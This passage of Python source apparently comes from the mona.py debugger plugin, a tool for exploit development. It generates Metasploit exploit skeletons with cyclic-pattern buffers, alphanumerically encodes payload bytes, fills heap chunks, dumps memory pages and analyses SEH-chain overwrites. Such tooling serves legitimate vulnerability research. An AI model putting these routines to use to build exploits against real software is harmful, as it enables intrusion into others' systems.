            exploitstr += (('    buffer = Rex::Text.pattern_create(' + str(cyclicsize)) + ')\n')
            if (exploittype.find('network') > (- 1)):
                exploitstr += '\n    print_status("Trying target #{target.name}...")\n'
                if (exploittype.find('tcp') > (- 1)):
                    exploitstr += '    sock.put(buffer)\n'
                    exploitstr += '\n    handler\n'
                elif (exploittype.find('udp') > (- 1)):
                    exploitstr += '    udp_sock.put(buffer)\n'
                    exploitstr += '\n    handler(udp_sock)\n'
            if (exploittype == 'fileformat'):
                exploitstr += '\n    file_create(buffer)\n\n'
            if (exploittype.find('network') > (- 1)):
                exploitstr += '    disconnect\n\n'
            exploitstr += '  end\n'
            objexploitfile.write((skeletonheader + '\n'), exploitfile)
            objexploitfile.write((skeletoninit + '\n'), exploitfile)
            objexploitfile.write(targetstr, exploitfile)
            objexploitfile.write(skeletoninit2, exploitfile)
            objexploitfile.write(exploitstr, exploitfile)
            objexploitfile.write('end', exploitfile)
            return

        def procFillChunk(args):
            reference = ''
            fillchar = 'A'
            allregs = dbg.getRegs()
            origreference = ''
            deref = False
            refreg = ''
            offset = 0
            signstuff = 1
            customsize = 0
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    sizearg = args['s']
                    if sizearg.lower().startswith('0x'):
                        sizearg = sizearg.lower().replace('0x', '')
                        customsize = int(sizearg, 16)
                    else:
                        customsize = int(sizearg)
            if ('r' in args):
                if (type(args['r']).__name__.lower() != 'bool'):
                    reference = args['r'].upper()
                    origreference = reference
                    if ((reference.find('[') > (- 1)) and (reference.find(']') > (- 1))):
                        refregtmp = reference.replace('[', '').replace(']', '').replace(' ', '')
                        if ((reference.find('+') > (- 1)) or (reference.find('-') > (- 1))):
                            refregtmpparts = []
                            if (reference.find('+') > (- 1)):
                                refregtmpparts = refregtmp.split('+')
                                signstuff = 1
                            if (reference.find('-') > (- 1)):
                                refregtmpparts = refregtmp.split('-')
                                signstuff = (- 1)
                            if (len(refregtmpparts) > 1):
                                offset = (int(refregtmpparts[1].replace('0X', ''), 16) * signstuff)
                                deref = True
                                refreg = refregtmpparts[0]
                                if (not (refreg in allregs)):
                                    dbg.log('** Please provide a valid reference using -r reg/reference **')
                                    return
                            else:
                                dbg.log('** Please provide a valid reference using -r reg/reference **')
                                return
                        else:
                            refreg = refregtmp
                            deref = True
                    elif ((reference.find('+') > (- 1)) or (reference.find('-') > (- 1))):
                        refregtmpparts = []
                        refregtmp = reference.replace(' ', '')
                        if (reference.find('+') > (- 1)):
                            refregtmpparts = refregtmp.split('+')
                            signstuff = 1
                        if (reference.find('-') > (- 1)):
                            refregtmpparts = refregtmp.split('-')
                            signstuff = (- 1)
                        if (len(refregtmpparts) > 1):
                            offset = (int(refregtmpparts[1].replace('0X', ''), 16) * signstuff)
                            refreg = refregtmpparts[0]
                            if (not (refreg in allregs)):
                                dbg.log('** Please provide a valid reference using -r reg/reference **')
                                return
                        else:
                            dbg.log('** Please provide a valid reference using -r reg/reference **')
                            return
                    else:
                        refregtmp = reference.replace(' ', '')
                        refreg = refregtmp
                        deref = False
                else:
                    dbg.log('** Please provide a valid reference using -r reg/reference **')
                    return
            else:
                dbg.log('** Please provide a valid reference using -r reg/reference **')
                return
            if (not (refreg in allregs)):
                dbg.log('** Please provide a valid reference using -r reg/reference **')
                return
            dbg.log(('Ref : %s' % refreg))
            dbg.log(('Offset : %d (0x%s)' % (offset, toHex(int(str(offset).replace('-', ''))))))
            dbg.log(('Deref ? : %s' % deref))
            if ('b' in args):
                if (type(args['b']).__name__.lower() != 'bool'):
                    if (args['b'].find('\\x') > (- 1)):
                        fillchar = hex2bin(args['b'])[0]
                    else:
                        fillchar = args['b'][0]
            refvalue = 0
            if deref:
                refref = 0
                try:
                    refref = (allregs[refreg] + offset)
                except:
                    dbg.log(('** Unable to read from %s (0x%08x)' % (origreference, (allregs[refreg] + offset))))
                try:
                    refvalue = struct.unpack('<L', dbg.readMemory(refref, 4))[0]
                except:
                    dbg.log(('** Unable to read from %s (0x%08x) -> 0x%08x' % (origreference, (allregs[reference] + offset), refref)))
                    return
            else:
                try:
                    refvalue = (allregs[refreg] + offset)
                except:
                    dbg.log(('** Unable to read from %s (0x%08x)' % (reference, (allregs[refreg] + offset))))
            dbg.log(('Reference : %s: 0x%08x' % (origreference, refvalue)))
            dbg.log(('Fill char : \\x%s' % bin2hex(fillchar)))
            cmd2run = ('!heap -p -a 0x%08x' % refvalue)
            output = dbg.nativeCommand(cmd2run)
            outputlines = output.split('\n')
            heapinfo = ''
            for line in outputlines:
                if ((line.find('[') > (- 1)) and (line.find(']') > (- 1)) and (line.find('(') > (- 1)) and (line.find(')') > (- 1))):
                    heapinfo = line
                    break
            if (heapinfo == ''):
                dbg.log('Address is not part of a heap chunk')
                if (customsize > 0):
                    dbg.log(('Filling memory location starting at 0x%08x with \\x%s' % (refvalue, bin2hex(fillchar))))
                    dbg.log(('Number of bytes to write : %d (0x%08x)' % (customsize, customsize)))
                    data = (fillchar * customsize)
                    dbg.writeMemory(refvalue, data)
                    dbg.log('Done')
                else:
                    dbg.log('Please specify a custom size with -s to fill up the memory location anyway')
            else:
                infofields = []
                cnt = 0
                charseen = False
                thisfield = ''
                while (cnt < len(heapinfo)):
                    if ((heapinfo[cnt] == ' ') and charseen and (thisfield != '')):
                        infofields.append(thisfield)
                        thisfield = ''
                    elif (not (heapinfo[cnt] == ' ')):
                        thisfield += heapinfo[cnt]
                        charseen = True
                    cnt += 1
                if (thisfield != ''):
                    infofields.append(thisfield)
                if (len(infofields) > 7):
                    chunkptr = hexStrToInt(infofields[0])
                    userptr = hexStrToInt(infofields[4])
                    size = hexStrToInt(infofields[5])
                    dbg.log(('Heap chunk found at 0x%08x, size 0x%08x (%d) bytes' % (chunkptr, size, size)))
                    dbg.log(('Filling chunk with \\x%s, starting at 0x%08x' % (bin2hex(fillchar), userptr)))
                    data = (fillchar * size)
                    dbg.writeMemory(userptr, data)
                    dbg.log('Done')
            return

        def procInfoDump(args):
            allpages = dbg.getMemoryPages()
            filename = 'infodump.xml'
            xmldata = '<info>\n'
            xmldata += '<modules>\n'
            if (len(g_modules) == 0):
                populateModuleInfo()
            modulestoquery = []
            for (thismodule, modproperties) in g_modules.iteritems():
                xmldata += ("  <module name='%s'>\n" % thismodule)
                thisbase = getModuleProperty(thismodule, 'base')
                thissize = getModuleProperty(thismodule, 'size')
                xmldata += ('    <base>0x%08x</base>\n' % thisbase)
                xmldata += ('    <size>0x%08x</size>\n' % thissize)
                xmldata += '  </module>\n'
            xmldata += '</modules>\n'
            orderedpages = []
            for tpage in allpages.keys():
                orderedpages.append(tpage)
            orderedpages.sort()
            if (len(orderedpages) > 0):
                xmldata += '<pages>\n'
                objfile = MnLog(filename)
                infofile = objfile.reset(clear=True, showheader=False)
                f = open(infofile, 'wb')
                for line in xmldata.split('\n'):
                    if (line != ''):
                        f.write((line + '\n'))
                tolog = 'Dumping the following pages to file:'
                dbg.log(tolog)
                tolog = 'Start        End        Size         ACL'
                dbg.log(tolog)
                for thispage in orderedpages:
                    page = allpages[thispage]
                    pagestart = page.getBaseAddress()
                    pagesize = page.getSize()
                    ptr = MnPointer(pagestart)
                    mod = ''
                    sectionname = ''
                    ismod = False
                    isstack = False
                    isheap = False
                    try:
                        mod = ptr.belongsTo()
                        if (mod != ''):
                            ismod = True
                    except:
                        mod = ''
                    if (not ismod):
                        if ptr.isOnStack():
                            isstack = True
                    if ((not ismod) and (not isstack)):
                        if ptr.isInHeap():
                            isheap = True
                    if ((not ismod) and (not isstack) and (not isheap)):
                        acl = page.getAccess(human=True)
                        if (not ('NOACCESS' in acl)):
                            tolog = ('0x%08x - 0x%08x (0x%08x) %s' % (pagestart, (pagestart + pagesize), pagesize, acl))
                            dbg.log(tolog)
                            thispage = dbg.readMemory(pagestart, pagesize)
                            f.write(('  <page start="0x%08x">\n' % pagestart))
                            f.write(('    <size>0x%08x</size>\n' % pagesize))
                            f.write(('    <acl>%s</acl>\n' % acl))
                            f.write('    <contents>')
                            memcontents = ''
                            for thisbyte in thispage:
                                memcontents += bin2hex(thisbyte)
                            f.write(memcontents)
                            f.write('</contents>\n')
                            f.write('  </page>\n')
                f.write('</pages>\n')
                f.write('</info>')
                dbg.log('')
                f.close()
                dbg.log('Done')
            return

        def procPEB(args):
            '\n\t\t\tShow the address of the PEB\n\t\t\t'
            pebaddy = dbg.getPEBAddress()
            dbg.log(('PEB is located at 0x%08x' % pebaddy), address=pebaddy)
            return

        def procTEB(args):
            '\n\t\t\tShow the address of the TEB for the current thread\n\t\t\t'
            tebaddy = dbg.getCurrentTEBAddress()
            dbg.log(('TEB is located at 0x%08x' % tebaddy), address=tebaddy)
            return

        def procPageACL(args):
            global silent
            silent = True
            findaddy = 0
            if ('a' in args):
                (findaddy, addyok) = getAddyArg(args['a'])
                if (not addyok):
                    dbg.log(('%s is an invalid address' % args['a']), highlight=1)
                    return
            if (findaddy > 0):
                dbg.log(('Displaying page information around address 0x%08x' % findaddy))
            allpages = dbg.getMemoryPages()
            dbg.log(('Total of %d pages : ' % len(allpages)))
            filename = 'pageacl.txt'
            orderedpages = []
            for tpage in allpages.keys():
                orderedpages.append(tpage)
            orderedpages.sort()
            toshow = []
            previouspage = 0
            nextpage = 0
            pagefound = False
            if (findaddy > 0):
                for thispage in orderedpages:
                    page = allpages[thispage]
                    pagestart = page.getBaseAddress()
                    pagesize = page.getSize()
                    pageend = (pagestart + pagesize)
                    if ((findaddy >= pagestart) and (findaddy < pageend)):
                        toshow.append(thispage)
                        pagefound = True
                    if (pagefound and (previouspage > 0)):
                        if (not (previouspage in toshow)):
                            toshow.append(previouspage)
                        if (not (thispage in toshow)):
                            toshow.append(thispage)
                        break
                    previouspage = thispage
            if (len(toshow) > 0):
                toshow.sort()
                orderedpages = toshow
                dbg.log(('Showing %d pages' % len(orderedpages)))
            if (len(orderedpages) > 0):
                objfile = MnLog(filename)
                aclfile = objfile.reset()
                tolog = 'Start        End        Size         ACL'
                dbg.log(tolog)
                objfile.write(tolog, aclfile)
                for thispage in orderedpages:
                    page = allpages[thispage]
                    pagestart = page.getBaseAddress()
                    pagesize = page.getSize()
                    ptr = MnPointer(pagestart)
                    mod = ''
                    sectionname = ''
                    try:
                        mod = ptr.belongsTo()
                        if (not (mod == '')):
                            mod = (('(' + mod) + ')')
                            sectionname = page.getSection()
                    except:
                        pass
                    if (mod == ''):
                        if ptr.isOnStack():
                            mod = '(Stack)'
                        elif ptr.isInHeap():
                            mod = '(Heap)'
                    acl = page.getAccess(human=True)
                    tolog = ('0x%08x - 0x%08x (0x%08x) %s %s %s' % (pagestart, (pagestart + pagesize), pagesize, acl, mod, sectionname))
                    objfile.write(tolog, aclfile)
                    dbg.log(tolog)
            silent = False
            return

        def procMacro(args):
            validcommands = ['run', 'set', 'list', 'del', 'add', 'show']
            validcommandfound = False
            selectedcommand = ''
            for command in validcommands:
                if (command in args):
                    validcommandfound = True
                    selectedcommand = command
                    break
            dbg.log('')
            if (not validcommandfound):
                dbg.log('*** Please specify a valid command. Valid commands are :')
                for command in validcommands:
                    dbg.log(('    -%s' % command))
                return
            macroname = ''
            if ('set' in args):
                if (type(args['set']).__name__.lower() != 'bool'):
                    macroname = args['set']
            if ('show' in args):
                if (type(args['show']).__name__.lower() != 'bool'):
                    macroname = args['show']
            if ('add' in args):
                if (type(args['add']).__name__.lower() != 'bool'):
                    macroname = args['add']
            if ('del' in args):
                if (type(args['del']).__name__.lower() != 'bool'):
                    macroname = args['del']
            if ('run' in args):
                if (type(args['run']).__name__.lower() != 'bool'):
                    macroname = args['run']
            filename = ''
            index = (- 1)
            insert = False
            iamsure = False
            if ('index' in args):
                if (type(args['index']).__name__.lower() != 'bool'):
                    index = int(args['index'])
                    if (index < 0):
                        dbg.log('** Please use a positive integer as index', highlight=1)
            if ('file' in args):
                if (type(args['file']).__name__.lower() != 'bool'):
                    filename = args['file']
            if ((filename != '') and (index > (- 1))):
                dbg.log('** Please either provide an index or a filename, not both', highlight=1)
                return
            if ('insert' in args):
                insert = True
            if ('iamsure' in args):
                iamsure = True
            argcommand = ''
            if ('cmd' in args):
                if (type(args['cmd']).__name__.lower() != 'bool'):
                    argcommand = args['cmd']
            dbg.setKBDB('monamacro.db')
            macros = dbg.getKnowledge('macro')
            if (macros is None):
                macros = {}
            if (selectedcommand == 'list'):
                for macro in macros:
                    thismacro = macros[macro]
                    macronametxt = ("Macro : '%s' : %d command(s)" % (macro, len(thismacro)))
                    dbg.log(macronametxt)
                dbg.log('')
                dbg.log(('Number of macros : %d' % len(macros)))
            if (selectedcommand == 'show'):
                if (macroname != ''):
                    if (not (macroname in macros)):
                        dbg.log(('** Macro %s does not exist !' % macroname))
                        return
                    else:
                        macro = macros[macroname]
                        macronametxt = ('Macro : %s' % macroname)
                        macroline = ('-' * len(macronametxt))
                        dbg.log(macronametxt)
                        dbg.log(macroline)
                        thismacro = macro
                        macrolist = []
                        for macroid in thismacro:
                            macrolist.append(macroid)
                        macrolist.sort()
                        nr_of_commands = 0
                        for macroid in macrolist:
                            macrocmd = thismacro[macroid]
                            if macrocmd.startswith('#'):
                                dbg.log(('   [%04d] File:%s' % (macroid, macrocmd[1:])))
                            else:
                                dbg.log(('   [%04d] %s' % (macroid, macrocmd)))
                            nr_of_commands += 1
                        dbg.log('')
                        dbg.log(('Nr of commands in this macro : %d' % nr_of_commands))
                else:
                    dbg.log('** Please specify the macroname to show !', highlight=1)
                    return
            if (selectedcommand == 'run'):
                if (macroname != ''):
                    if (not (macroname in macros)):
                        dbg.log(('** Macro %s does not exist !' % macroname))
                        return
                    else:
                        macro = macros[macroname]
                        macronametxt = ('Running macro : %s' % macroname)
                        macroline = ('-' * len(macronametxt))
                        dbg.log(macronametxt)
                        dbg.log(macroline)
                        thismacro = macro
                        macrolist = []
                        for macroid in thismacro:
                            macrolist.append(macroid)
                        macrolist.sort()
                        for macroid in macrolist:
                            macrocmd = thismacro[macroid]
                            if macrocmd.startswith('#'):
                                dbg.log(('Executing script %s' % macrocmd[1:]))
                                output = dbg.nativeCommand(('$<%s' % macrocmd[1:]))
                                dbg.logLines(output)
                                dbg.log(('-' * 40))
                            else:
                                dbg.log(('Index %d : %s' % (macroid, macrocmd)))
                                dbg.log('')
                                output = dbg.nativeCommand(macrocmd)
                                dbg.logLines(output)
                                dbg.log(('-' * 40))
                        dbg.log('')
                        dbg.log('[+] Done.')
                else:
                    dbg.log('** Please specify the macroname to run !', highlight=1)
                    return
            if (selectedcommand == 'set'):
                if (macroname != ''):
                    if (not (macroname in macros)):
                        dbg.log(('** Macro %s does not exist !' % macroname))
                        return
                    if ((argcommand == '') and (filename == '')):
                        dbg.log('** Please enter a valid command with parameter -cmd', highlight=1)
                        return
                    thismacro = macros[macroname]
                    if (index == (- 1)):
                        for i in thismacro:
                            thiscmd = thismacro[i]
                            if thiscmd.startswith('#'):
                                dbg.log('** You cannot edit a macro that uses a scriptfile.', highlight=1)
                                dbg.log(('   Edit file %s instead' % thiscmd[1:]), highlight=1)
                                return
                        if (filename == ''):
                            nextindex = 0
                            for macindex in thismacro:
                                if (macindex >= nextindex):
                                    nextindex = (macindex + 1)
                            if (thismacro.__class__.__name__ == 'dict'):
                                thismacro[nextindex] = argcommand
                            else:
                                thismacro = {}
                                thismacro[nextindex] = argcommand
                        else:
                            thismacro = {}
                            nextindex = 0
                            thismacro[0] = ('#%s' % filename)
                        macros[macroname] = thismacro
                        dbg.addKnowledge('macro', macros)
                        dbg.log(('[+] Done, saved new command at index %d.' % nextindex))
                    else:
                        if (index in thismacro):
                            if (argcommand == '#'):
                                del thismacro[index]
                            else:
                                for i in thismacro:
                                    thiscmd = thismacro[i]
                                    if thiscmd.startswith('#'):
                                        dbg.log('** You cannot edit a macro that uses a scriptfile.', highlight=1)
                                        dbg.log(('   Edit file %s instead' % thiscmd[1:]), highlight=1)
                                        return
                                if (not insert):
                                    thismacro[index] = argcommand
                                else:
                                    indexes = []
                                    for macindex in thismacro:
                                        indexes.append(macindex)
                                    indexes.sort()
                                    thismacro2 = {}
                                    cmdadded = False
                                    for i in indexes:
                                        if (i < index):
                                            thismacro2[i] = thismacro[i]
                                        elif (i == index):
                                            thismacro2[i] = argcommand
                                            thismacro2[(i + 1)] = thismacro[i]
                                        elif (i > index):
                                            thismacro2[(i + 1)] = thismacro[i]
                                    thismacro = thismacro2
                        else:
                            for i in thismacro:
                                thiscmd = thismacro[i]
                                if thiscmd.startswith('#'):
                                    dbg.log('** You cannot edit a macro that uses a scriptfile.', highlight=1)
                                    dbg.log(('   Edit file %s instead' % thiscmd[1:]), highlight=1)
                                    return
                            if (argcommand != '#'):
                                thismacro[index] = argcommand
                            else:
                                dbg.log(('** Index %d does not exist, unable to remove the command at that position' % index), highlight=1)
                        macros[macroname] = thismacro
                        dbg.addKnowledge('macro', macros)
                        if (argcommand != '#'):
                            dbg.log(('[+] Done, saved new command at index %d.' % index))
                        else:
                            dbg.log(('[+] Done, removed command at index %d.' % index))
                else:
                    dbg.log('** Please specify the macroname to edit !', highlight=1)
                    return
            if (selectedcommand == 'add'):
                if (macroname != ''):
                    if (macroname in macros):
                        dbg.log(("** Macro '%s' already exists !" % macroname), highlight=1)
                        return
                    else:
                        macros[macroname] = {}
                        dbg.log(("[+] Adding macro '%s'" % macroname))
                        dbg.addKnowledge('macro', macros)
                        dbg.log('[+] Done.')
                else:
                    dbg.log('** Please specify the macroname to add !', highlight=1)
                    return
            if (selectedcommand == 'del'):
                if (not (macroname in macros)):
                    dbg.log(("** Macro '%s' doesn't exist !" % macroname), highlight=1)
                elif (not iamsure):
                    dbg.log(("** To delete macro '%s', please add the -iamsure flag to the command" % macroname))
                    return
                else:
                    dbg.forgetKnowledge('macro', macroname)
                    dbg.log(("[+] Done, deleted macro '%s'" % macroname))
            return

        def procEnc(args):
            validencoders = ['alphanum']
            encodertyperror = True
            byteerror = True
            encodertype = ''
            bytestoencodestr = ''
            bytestoencode = ''
            badbytes = ''
            if ('t' in args):
                if (type(args['t']).__name__.lower() != 'bool'):
                    encodertype = args['t']
                    encodertyperror = False
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    bytestoencodestr = args['s']
                    byteerror = False
            if ('f' in args):
                if (type(args['f']).__name__.lower() != 'bool'):
                    binfile = getAbsolutePath(args['f'])
                    if os.path.exists(binfile):
                        if (not silent):
                            dbg.log(('[+] Reading bytes from %s' % binfile))
                        try:
                            f = open(binfile, 'rb')
                            content = f.readlines()
                            f.close()
                            for c in content:
                                for a in c:
                                    bytestoencodestr += ('\\x%02x' % ord(a))
                            byteerror = False
                        except:
                            dbg.log(('*** Error - unable to read bytes from %s' % binfile))
                            dbg.logLines(traceback.format_exc(), highlight=True)
                            byteerror = True
                    else:
                        byteerror = True
                else:
                    byteerror = True
            if ('cpb' in args):
                if (type(args['cpb']).__name__.lower() != 'bool'):
                    badbytes = hex2bin(args['cpb'])
            if (not (encodertype in validencoders)):
                encodertyperror = True
            if (bytestoencodestr == ''):
                byteerror = True
            else:
                bytestoencode = hex2bin(bytestoencodestr)
            if encodertyperror:
                dbg.log('*** Please specific a valid encodertype with parameter -t.', highlight=True)
                dbg.log(('*** Valid types are: %s' % validencoders), highlight=True)
            if byteerror:
                dbg.log('*** Please specify a valid series of bytes with parameter -s', highlight=True)
                dbg.log('*** or specify a valid path with parameter -f', highlight=True)
            if (encodertyperror or byteerror):
                return
            else:
                cEncoder = MnEncoder(bytestoencode)
                encodedbytes = ''
                if (encodertype == 'alphanum'):
                    encodedbytes = cEncoder.encodeAlphaNum(badchars=badbytes)
                    if (len(encodedbytes) > 0):
                        logfile = MnLog(('encoded_%s.txt' % encodertype))
                        thislog = logfile.reset()
                        if (not silent):
                            dbg.log('')
                            dbg.log('Results:')
                            dbg.log('--------')
                        logfile.write('', thislog)
                        logfile.write('Results:', thislog)
                        logfile.write('--------', thislog)
                        encodedindex = []
                        fulllist_str = ''
                        fulllist_bin = ''
                        for i in encodedbytes:
                            encodedindex.append(i)
                        for i in encodedindex:
                            thisline = encodedbytes[i]
                            thislinebytes = ('\\x' + '\\x'.join((bin2hex(a) for a in thisline[0])))
                            logline = ('  %s : %s : %s' % (thisline[0], thislinebytes, thisline[1]))
                            if (not silent):
                                dbg.log(('%s' % logline))
                            logfile.write(logline, thislog)
                            fulllist_str += thislinebytes
                            fulllist_bin += thisline[0]
                        if (not silent):
                            dbg.log('')
                            dbg.log('Full encoded string:')
                            dbg.log('--------------------')
                            dbg.log(('%s' % fulllist_bin))
                        logfile.write('', thislog)
                        logfile.write('Full encoded string:', thislog)
                        logfile.write('--------------------', thislog)
                        logfile.write(('%s' % fulllist_bin), thislog)
                        logfile.write('', thislog)
                        logfile.write('Full encoded hex:', thislog)
                        logfile.write('-----------------', thislog)
                        logfile.write(('%s' % fulllist_str), thislog)
            return

        def procString(args):
            mode = ''
            useunicode = False
            terminatestring = True
            addy = 0
            regs = dbg.getRegs()
            stringtowrite = ''
            if ((not ('r' in args)) and (not ('w' in args))):
                dbg.log('*** Error: you must indicate if you want to read (-r) or write (-w) ***', highlight=True)
                return
            addresserror = False
            if (not ('a' in args)):
                addresserror = True
            elif (type(args['a']).__name__.lower() != 'bool'):
                if (str(args['a']).upper() in regs):
                    addy = regs[str(args['a'].upper())]
                else:
                    addy = int(args['a'], 16)
            else:
                addresserror = True
            if addresserror:
                dbg.log('*** Error: you must specify a valid address with -a ***', highlight=True)
                return
            if ('w' in args):
                mode = 'write'
            if ('r' in args):
                mode = 'read'
            if ('u' in args):
                useunicode = True
            stringerror = False
            if (('w' in args) and (not ('s' in args))):
                stringerror = True
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    stringtowrite = args['s']
                else:
                    stringerror = True
            if ('noterminate' in args):
                terminatestring = False
            if stringerror:
                dbg.log('*** Error: you must specify a valid string with -s ***', highlight=True)
                return
            if (mode == 'read'):
                stringinmemory = ''
                extra = ' '
                try:
                    if (not useunicode):
                        stringinmemory = dbg.readString(addy)
                    else:
                        stringinmemory = dbg.readWString(addy)
                        extra = ' (unicode) '
                    dbg.log(('String%sat 0x%08x:' % (extra, addy)))
                    dbg.log(('%s' % stringinmemory))
                except:
                    dbg.log(('Unable to read string at 0x%08x' % addy))
            if (mode == 'write'):
                origstring = stringtowrite
                writtendata = ''
                try:
                    if (not useunicode):
                        if terminatestring:
                            stringtowrite += '\x00'
                        byteswritten = ''
                        for c in stringtowrite:
                            byteswritten += (' %s' % bin2hex(c))
                        dbg.writeMemory(addy, stringtowrite)
                        writtendata = dbg.readString(addy)
                        dbg.log(('Wrote string (%d bytes) to 0x%08x:' % (len(stringtowrite), addy)))
                        dbg.log(('%s' % byteswritten))
                    else:
                        newstring = ''
                        for c in stringtowrite:
                            newstring += ('%s%s' % (c, '\x00'))
                        if terminatestring:
                            newstring += '\x00\x00'
                        dbg.writeMemory(addy, newstring)
                        dbg.log(('Wrote unicode string (%d bytes) to 0x%08x' % (len(newstring), addy)))
                        writtendata = dbg.readWString(addy)
                        byteswritten = ''
                        for c in newstring:
                            byteswritten += (' %s' % bin2hex(c))
                        dbg.log(('%s' % byteswritten))
                    if (not writtendata.startswith(origstring)):
                        dbg.log("Write operation succeeded, but the string in memory doesn't appear to be there", highlight=True)
                except:
                    dbg.log(('Unable to write the string to 0x%08x' % addy))
                    dbg.logLines(traceback.format_exc(), highlight=True)
            return

        def procKb(args):
            validcommands = ['set', 'list', 'del']
            validcommandfound = False
            selectedcommand = ''
            selectedid = ''
            selectedvalue = ''
            for command in validcommands:
                if (command in args):
                    validcommandfound = True
                    selectedcommand = command
                    break
            dbg.log('')
            if (not validcommandfound):
                dbg.log('*** Please specify a valid command. Valid commands are :')
                for command in validcommands:
                    dbg.log(('    -%s' % command))
                return
            if ('id' in args):
                if (type(args['id']).__name__.lower() != 'bool'):
                    selectedid = args['id']
            if ('value' in args):
                if (type(args['value']).__name__.lower() != 'bool'):
                    selectedvalue = args['value']
            dbg.log(('Knowledgebase database : %s' % dbg.getKBDB()))
            kb = dbg.listKnowledge()
            if (selectedcommand == 'list'):
                dbg.log(('Number of IDs in Knowledgebase : %d' % len(kb)))
                if (len(kb) > 0):
                    if (selectedid == ''):
                        dbg.log('IDs :')
                        dbg.log('-----')
                        for kbid in kb:
                            dbg.log(kbid)
                    elif (selectedid in kb):
                        kbid = dbg.getKnowledge(selectedid)
                        kbtype = kbid.__class__.__name__
                        kbtitle = ('Entries for ID %s (type %s) :' % (selectedid, kbtype))
                        dbg.log(kbtitle)
                        dbg.log(('-' * (len(kbtitle) + 2)))
                        if (selectedvalue != ''):
                            dbg.log(('  (Filter : %s)' % selectedvalue))
                        nrentries = 0
                        if (kbtype == 'dict'):
                            for dictkey in kbid:
                                if ((selectedvalue == '') or (selectedvalue in dictkey)):
                                    logline = ''
                                    if ((kbid[dictkey].__class__.__name__ == 'int') or (kb[dictkey].__class__.__name__ == 'long')):
                                        logline = ('  %s : %d (0x%x)' % (str(dictkey), kbid[dictkey], kbid[dictkey]))
                                    else:
                                        logline = ('  %s : %s' % (str(dictkey), kbid[dictkey]))
                                    dbg.log(logline)
                                    nrentries += 1
                        if (kbtype == 'list'):
                            cnt = 0
                            for entry in kbid:
                                dbg.log(('  %d : %s' % (cnt, kbid[entry])))
                                cnt += 1
                                nrentries += 1
                        if (kbtype == 'str'):
                            dbg.log(('  %s' % kbid))
                            nrentries += 1
                        if ((kbtype == 'int') or (kbtype == 'long')):
                            dbg.log(('  %d (0x%08x)' % (kbid, kbid)))
                            nrentries += 1
                        dbg.log('')
                        filtertxt = ''
                        if (selectedvalue != ''):
                            filtertxt = 'filtered '
                        dbg.log(('Number of %sentries for ID %s : %d' % (filtertxt, selectedid, nrentries)))
                    else:
                        dbg.log(('ID %s was not found in the Knowledgebase' % selectedid))
            if (selectedcommand == 'set'):
                if (selectedid == ''):
                    dbg.log('*** Please enter a valid ID with -id', highlight=1)
                    return
                if (selectedvalue == ''):
                    dbg.log('*** Please enter a valid value', highlight=1)
                    return
                if (selectedid in kb):
                    if (selectedid == 'vtableCache'):
                        valueparts = selectedvalue.split(',')
                        if (len(valueparts) == 2):
                            vtablename = valueparts[0].strip(' ')
                            vtablevalue = 0
                            if ('0x' in valueparts[1].lower()):
                                vtablevalue = int(valueparts[1], 16)
                            else:
                                vtablevalue = int(valueparts[1])
                            kbadd = {}
                            kbadd[vtablename] = vtablevalue
                            dbg.addKnowledge(selectedid, kbadd)
                        else:
                            dbg.log('*** Please provide a valid value for -value')
                            dbg.log('*** KB %s contains a list, please use a comma')
                            dbg.log('*** to separate entries. First entry should be a string,')
                            dbg.log('*** Second entry should be an integer.')
                            return
                    else:
                        dbg.addKnowledge(selectedid, selectedvalue)
                    dbg.log(' ')
                    dbg.log(('ID %s updated.' % selectedid))
                else:
                    dbg.log(('ID %s was not found in the Knowledgebase' % selectedid))
            if (selectedcommand == 'del'):
                if ((selectedid == '') or (selectedid not in kb)):
                    dbg.log('*** Please enter a valid ID with -id', highlight=1)
                    return
                else:
                    dbg.forgetKnowledge(selectedid, selectedvalue)
                if (selectedvalue == ''):
                    dbg.log(('*** Entire ID %s removed from Knowledgebase' % selectedid))
                else:
                    dbg.log(('*** Object %s in ID %s removed from Knowledgebase' % (selectedvalue, selectedid)))
            return

        def procBPSeh(self):
            sehchain = dbg.getSehChain()
            dbg.log(('Nr of SEH records : %d' % len(sehchain)))
            if (len(sehchain) > 0):
                dbg.log('SEH Chain :')
                dbg.log('-----------')
                dbg.log('Address     Next SEH    Handler')
                for sehrecord in sehchain:
                    address = sehrecord[0]
                    sehandler = sehrecord[1]
                    nseh = ''
                    try:
                        nsehvalue = struct.unpack('<L', dbg.readMemory(address, 4))[0]
                        nseh = ('0x%08x' % nsehvalue)
                    except:
                        nseh = '0x????????'
                    bpsuccess = True
                    try:
                        if (__DEBUGGERAPP__ == 'WinDBG'):
                            bpsuccess = dbg.setBreakpoint(sehandler)
                        else:
                            dbg.setBreakpoint(sehandler)
                            bpsuccess = True
                    except:
                        bpsuccess = False
                    bptext = ''
                    if (not bpsuccess):
                        bptext = 'BP failed'
                    else:
                        bptext = 'BP set'
                    ptr = MnPointer(sehandler)
                    funcinfo = ptr.getPtrFunction()
                    dbg.log(('0x%08x  %s  0x%08x %s <- %s' % (address, nseh, sehandler, funcinfo, bptext)))
            dbg.log('')
            return 'Done'

        def procSehChain(self):
            sehchain = dbg.getSehChain()
            dbg.log(('Nr of SEH records : %d' % len(sehchain)))
            handlersoverwritten = {}
            if (len(sehchain) > 0):
                dbg.log(('Start of chain (TEB FS:[0]) : 0x%08x' % sehchain[0][0]))
                dbg.log('Address     Next SEH    Handler')
                dbg.log('-------     --------    -------')
                for sehrecord in sehchain:
                    recaddress = sehrecord[0]
                    sehandler = sehrecord[1]
                    nseh = ''
                    try:
                        nsehvalue = struct.unpack('<L', dbg.readMemory(recaddress, 4))[0]
                        nseh = ('0x%08x' % nsehvalue)
                    except:
                        nseh = 0
                        sehandler = 0
                    overwritedata = checkSEHOverwrite(recaddress, nseh, sehandler)
                    overwritemark = ''
                    funcinfo = ''
                    if (sehandler > 0):
                        ptr = MnPointer(sehandler)
                        funcinfo = ptr.getPtrFunction()
                    else:
                        funcinfo = ' (corrupted record)'
                        if str(nseh).startswith('0x'):
                            nseh = ('0x%08x' % int(nseh, 16))
                        else:
                            nseh = ('0x%08x' % int(nseh))
                    if (len(overwritedata) > 0):
                        handlersoverwritten[recaddress] = overwritedata
                        smashoffset = int(overwritedata[1])
                        typeinfo = ''
                        if (overwritedata[0] == 'unicode'):
                            smashoffset += 2
                            typeinfo = ' [unicode]'
                        overwritemark = (' (record smashed at offset %d%s)' % (smashoffset, typeinfo))
